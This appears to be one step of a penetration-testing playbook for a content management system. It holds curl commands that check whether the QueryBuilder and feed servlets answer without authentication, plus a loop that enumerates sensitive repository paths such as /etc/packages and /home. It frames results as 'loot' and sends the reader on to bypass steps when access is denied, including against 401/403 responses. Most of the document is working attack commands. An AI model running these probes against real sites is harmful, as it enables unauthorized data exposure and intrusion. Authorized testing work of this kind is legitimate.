# Batch 03 — QueryBuilder direct (no bypass yet)

## objective

Test whether `/bin/querybuilder.json` (and feed) answer **as-is**.  
If yes, you already have the main loot door. If no, you know bypasses are required.

## estimated_time

45–75 minutes

## prerequisites

- Batches 01–02 done
- `T` set

## testing_workflow

### 1) Technique A — JSON QueryBuilder

```bash
T="https://TARGET"

curl -sk -o /tmp/qb.json -w "qb:%{http_code} size=%{size_download}\n" \
  -G "$T/bin/querybuilder.json" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=5"
head -c 500 /tmp/qb.json; echo
```

Success signals: `"hits"`, `"success":true`, lots of JSON properties.

### 2) Technique B — feed servlet (sibling)

```bash
curl -sk -o /tmp/qb.feed -w "feed:%{http_code} size=%{size_download}\n" \
  -G "$T/bin/querybuilder.feed" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=5"
head -c 400 /tmp/qb.feed; echo
```

### 3) Technique C — same API, other roots (only if A or B worked)

```bash
QB="$T/bin/querybuilder.json"
for path in / /content /etc /etc/packages /home /libs; do
  echo "=== path=$path ==="
  curl -sk -G "$QB" \
    --data-urlencode "path=$path" \
    --data-urlencode "p.limit=3" \
    -w " code=%{http_code}\n" -o /tmp/q.json
  head -c 180 /tmp/q.json; echo
done
```

### 4) Save the working base URL

```bash
# If direct worked:
export QB="$T/bin/querybuilder.json"
# Save to your notes file for later batches
```

If blocked, leave `QB` unset and move on — do **not** invent complex queries yet.

## decision_points

| If… | Then… |
|-----|--------|
| QueryBuilder returns real results | Jump to **07** for loot this session **or** finish timer then 07 next — optional skip 04–06 until needed |
| Consistent 404/deny | Continue **04** (most common path) |
| 401/403 | Note ACL; try bypasses anyway in 04–06; auth later if in scope |
| Feed works, JSON does not | Use feed for path enum; still try bypasses for JSON |

## expected_findings

- Unauthenticated QueryBuilder access (high impact lead)
- Or confirmed “blocked at edge” baseline for bypass comparison

## next_batch_to_continue_with

- If **open** → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)** (skip 04–06 until something else needs them)  
- If **blocked** → **[04-bypass-semicolon.md](./04-bypass-semicolon.md)**
